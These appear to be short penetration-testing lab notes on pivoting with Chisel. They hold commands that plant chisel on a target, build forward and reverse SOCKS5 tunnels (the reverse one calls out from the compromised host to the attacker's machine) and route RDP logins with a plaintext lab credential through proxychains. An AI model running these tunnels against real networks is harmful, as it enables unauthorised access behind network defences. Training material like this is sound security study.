- [ ] SOCKS5 Tunneling with Chisel
- [ ] Chisel Reverse Pivot

Tunneling with Chisel!!!
```sh
# chisel listener | chisel server
scp chisel ubuntu@10.129.161.77:~/
./chisel server -v -p 1234 --socks5
# chisel client | on the attack box
./chisel client -v 10.129.161.77:1234 socks
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf
# using the tunnel
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
Chisel Reverse Pivot!!!
```sh
# Starting the Chisel Server on our Attack Host
./chisel server --reverse -v -p 1234 --socks5
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf

# Connecting the Chisel Client to our Attack Host 
./chisel client -v 10.10.16.42:1234 R:socks
.\chisel.exe client -v 192.168.45.171:1234 R:socks

# using the tunnel
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```